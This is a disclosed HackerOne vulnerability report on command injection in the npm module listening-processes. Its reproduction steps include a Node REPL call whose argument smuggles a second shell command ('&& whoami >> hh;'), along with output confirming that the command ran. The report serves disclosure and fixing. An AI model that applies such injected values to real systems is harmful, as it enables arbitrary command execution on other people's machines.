---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '511459'
original_report_id: '511459'
title: '[listening-processes] Command Injection'
weakness: OS Command Injection
team_handle: nodejs-ecosystem
created_at: '2019-03-18T08:14:28.733Z'
disclosed_at: '2020-02-02T23:00:31.595Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# [listening-processes] Command Injection

## Metadata

- HackerOne Report ID: 511459
- Weakness: OS Command Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-02-02T23:00:31.595Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Command Injection in listening-processes
It allows an attacker to execute arbitrary commands.

# Module

**module name:** listening-processes
**version:** 1.2.0
**npm page:** `https://www.npmjs.com/package/listening-processes`

## Module Description

> A simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.

## Module Stats

6 downloads in the last day
12 downloads in the last week
28 downloads in the last month

# Vulnerability

## Vulnerability Description

> An attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands. 

## Steps To Reproduce:

```
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```
```
$ cat hh
notpwnguy
```
## Patch

> If you're able to provide a patch with the fix please post it in this section

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OPERATING SYSTEM VERSION : Mac Os
- NODEJS VERSION : v10.5.0
- NPM VERSION : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary Commands can be executed!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
